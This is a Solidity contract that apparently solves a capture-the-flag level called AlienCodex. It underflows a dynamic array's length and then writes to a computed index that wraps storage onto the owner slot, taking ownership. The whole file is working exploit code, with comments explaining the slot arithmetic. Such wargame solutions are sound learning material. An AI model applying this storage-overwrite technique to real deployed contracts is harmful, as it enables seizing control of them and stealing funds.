pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract HackCodex {
    function claimOwnership(address _instance) public{
        // firstly we have to enable access by setting contact to true.
        AlienCodex(_instance).make_contact();

        // then we need to call the retract fn to underflow the array so that the value
        // at slot 1 (the length of the array) would be 0xFFF...FF
        AlienCodex(_instance).retract();

        // we need to find the index which will override the owner variable.
        // dynamically-allocated arrays use the following formula for slot-assigning
        //      keccak256(slot) + n         - where n is the array index
        uint256 index = uint(2)**uint256(256) - uint(keccak256(abi.encodePacked(uint(1))));
        AlienCodex(_instance).revise(index, bytes32(uint256(tx.origin)));

    }
}
